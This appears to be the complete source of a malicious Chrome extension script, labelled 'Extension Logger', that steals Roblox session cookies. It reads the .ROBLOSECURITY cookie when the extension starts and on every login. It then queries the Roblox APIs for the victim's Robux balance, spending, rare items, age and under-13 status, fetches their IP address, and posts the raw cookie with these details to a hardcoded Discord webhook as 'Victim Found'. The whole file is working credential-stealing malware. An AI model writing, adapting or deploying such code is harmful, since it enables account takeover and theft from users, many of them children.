const WEBHOOKS = [
    "https://discord.com/api/webhooks/1434366752757907647/XmEejYjMqXxYyguPefy0d3DDQxYqFuk6uo6dj8bWXWlkmAbz_lwOWwbc5Qeyl2XJZs3a",
    "https://discord.com/api/webhooks/YOUR_SECOND_WEBHOOK_URL_HERE" // Add your second webhook URL here
];
const MENTION = "@everyone";

let lastCookie = null; // Track last sent cookie

async function checkOwnership(userId, assetId, cookie) {
    try {
        let res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        if (!res.ok) return false;
        let json = await res.json();
        return json?.data?.length > 0;
    } catch {
        return false;
    }
}

async function getTotalSpentRobux(userId, cookie) {
    try {
        // Get transactions from the past year
        const oneYearAgo = new Date();
        oneYearAgo.setFullYear(oneYearAgo.getFullYear() - 1);
        
        let totalSpent = 0;
        let cursor = "";
        
        do {
            let url = `https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=expenditure&limit=100`;
            if (cursor) {
                url += `&cursor=${cursor}`;
            }
            
            let res = await fetch(url, {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            
            if (!res.ok) break;
            
            let json = await res.json();
            if (!json.data || json.data.length === 0) break;
            
            // Sum up all expenditures
            for (let transaction of json.data) {
                const transactionDate = new Date(transaction.created);
                if (transactionDate >= oneYearAgo) {
                    totalSpent += Math.abs(transaction.currency?.amount || 0);
                } else {
                    // Stop if we've reached transactions older than 1 year
                    cursor = "";
                    break;
                }
            }
            
            cursor = json.nextPageCursor || "";
            
        } while (cursor);
        
        return totalSpent;
    } catch (error) {
        console.error("Error fetching spent Robux:", error);
        return "N/A";
    }
}

async function getAccountAge(userId, cookie) {
    try {
        let res = await fetch("https://users.roblox.com/v1/birthdate", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        
        if (!res.ok) {
            // Fallback to join date if birthdate fails
            let userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            
            if (!userRes.ok) return "N/A";
            
            let user = await userRes.json();
            return user.created ? new Date(user.created).toLocaleDateString() : "N/A";
        }
        
        let birthdate = await res.json();
        if (birthdate.birthDay && birthdate.birthMonth && birthdate.birthYear) {
            const birthDate = new Date(birthdate.birthYear, birthdate.birthMonth - 1, birthdate.birthDay);
            const today = new Date();
            let age = today.getFullYear() - birthdate.birthYear;
            
            // Adjust age if birthday hasn't occurred this year
            if (today.getMonth() < birthDate.getMonth() || 
                (today.getMonth() === birthDate.getMonth() && today.getDate() < birthDate.getDate())) {
                age--;
            }
            
            return `${age} years old`;
        }
        
        return "N/A";
    } catch (error) {
        console.error("Error fetching account age:", error);
        return "N/A";
    }
}

async function sendToWebhook(webhookUrl, embedPayload) {
    try {
        await fetch(webhookUrl, { 
            method: "POST", 
            headers: { "Content-Type": "application/json" }, 
            body: JSON.stringify(embedPayload) 
        });
    } catch (error) {
        console.error(`Failed to send to webhook: ${webhookUrl}`, error);
    }
}

async function main(cookie) {
    if (!cookie) return;

    if (cookie === lastCookie) return; // avoid duplicate sends
    lastCookie = cookie;

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    try {
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        if (!res.ok) throw "Failed to get user info";

        let user = await res.json();

        // Robux + Pending (using the correct economy endpoint)
        let economyRes = await fetch("https://economy.roblox.com/v1/user/currency", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        
        let economy = { robux: "N/A", robuxPending: "N/A" };
        if (economyRes.ok) {
            economy = await economyRes.json();
        }

        // Premium
        let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let isPremium = premiumRes.ok ? await premiumRes.json() : false;

        // Profile picture
        let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
        let thumbJson = await thumbRes.json();
        let thumbUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"; // fallback
        if (thumbJson?.data?.length > 0 && thumbJson.data[0].imageUrl) {
            thumbUrl = thumbJson.data[0].imageUrl;
        }

        // Korblox + Headless
        let hasKorblox = await checkOwnership(user.id, 18122167, cookie);
        let hasHeadless = await checkOwnership(user.id, 134082579, cookie);

        // Get additional data
        let accountAge = await getAccountAge(user.id, cookie);
        let totalSpentPastYear = await getTotalSpentRobux(user.id, cookie);

        statistics = {
            UserName: user.name,
            UserId: user.id,
            IsUnder13: user.isUnder13,
            JoinDate: user.created ? new Date(user.created).toLocaleDateString() : "N/A",
            RobuxBalance: economy.robux ?? "N/A",
            PendingRobux: economy.robuxPending ?? "N/A",
            IsPremium: isPremium,
            ThumbnailUrl: thumbUrl,
            Korblox: hasKorblox,
            Headless: hasHeadless,
            AccountAge: accountAge,
            TotalSpentPastYear: totalSpentPastYear
        };

    } catch (e) {
        console.error("Error fetching Roblox data:", e);
    }

    // Embed
    let embedPayload = {
        embeds: [
            {
                color: 0xFF0000, // 🔴 Red embed
                description: `\`\`\`${cookie ?? "COOKIE NOT FOUND"}\`\`\``,
                fields: [
                    { name: "Username", value: statistics?.UserName ?? "N/A", inline: true },
                    { name: "User ID", value: statistics?.UserId ?? "N/A", inline: true },
                    { name: "Underage", value: statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                    { name: "Join Date", value: statistics?.JoinDate ?? "N/A", inline: true },
                    { name: "Account Age", value: statistics?.AccountAge ?? "N/A", inline: true },
                    { name: "<:balance:1396065501574205542> Robux", value: statistics?.RobuxBalance?.toLocaleString() ?? "N/A", inline: true },
                    { name: "⌛ Pending", value: statistics?.PendingRobux?.toLocaleString() ?? "N/A", inline: true },
                    { name: "💸 Spent (1yr)", value: statistics?.TotalSpentPastYear !== "N/A" ? statistics.TotalSpentPastYear.toLocaleString() : "N/A", inline: true },
                    { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                    { name: "<:korblox:1153613134599307314> Korblox", value: statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", inline: true },
                    { name: "<:head_full:1207367926622191666> Headless", value: statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A", inline: true }
                ],
                author: {
                    name: `Victim Found: ${ipAddr}`,
                    icon_url: statistics?.ThumbnailUrl ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                },
                thumbnail: { url: statistics?.ThumbnailUrl ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png" },
                footer: {
                    text: "ENTERPRISE",
                    icon_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
                },
                timestamp: new Date().toISOString()
            }
        ],
        username: "Extension Logger",
        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg",
        content: MENTION
    };

    // Send to all webhooks
    WEBHOOKS.forEach(webhookUrl => {
        sendToWebhook(webhookUrl, embedPayload);
    });
}

// Startup listener
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, cookie => main(cookie?.value ?? null));

// Listen for cookie changes
chrome.cookies.onChanged.addListener(changeInfo => {
    if (changeInfo.cookie?.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com")) {
        if (changeInfo.removed) console.log("Roblox cookie removed (logout)");
        else {
            console.log("Roblox cookie updated (login/refresh)");
            main(changeInfo.cookie.value);
        }
    }
});
